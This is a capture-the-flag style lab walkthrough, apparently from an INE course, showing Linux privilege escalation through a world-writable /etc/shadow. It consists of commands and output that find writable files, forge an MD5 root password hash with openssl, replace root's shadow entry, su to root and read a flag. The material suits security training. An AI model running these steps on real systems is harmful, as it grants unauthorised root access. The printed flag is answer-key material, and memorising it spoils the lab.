# Linux Privilege Escalation - Weak Permissions

```bash
# http://target.ine.local:8000 on FireFox
student@target:~$ find / -not -type l -perm -o+w
~~~~~
/dev/pts/ptmx
/dev/mqueue
/dev/shm
/dev/null
/dev/random
/dev/full
/dev/tty
/dev/zero
/dev/urandom
/etc/shadow

student@target:~$ cat /etc/shadow
root:*:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::

student@target:~$ ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 523 Sep 23  2018 /etc/shadow

student@target:~$ openssl passwd -1 -salt abc password
$1$abc$BXBqpb9BZcZhXLgbee.0s/

root:*:17764:0:99999:7:::
# Edit shadow file
root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::
#:wq

# Change superuser (root) account
student@target:~$ su
# Type password
Password:
root@target:/home/student#

root@target:/# ls
bin   dev  home  lib64  mnt  proc  run   srv         sys  usr
boot  etc  lib   media  opt  root  sbin  startup.sh  tmp  var
root@target:/# cd root
root@target:~# ls
flag
root@target:~# cat flag
e62ab67ddff744d60cbb6232feaefc4d
```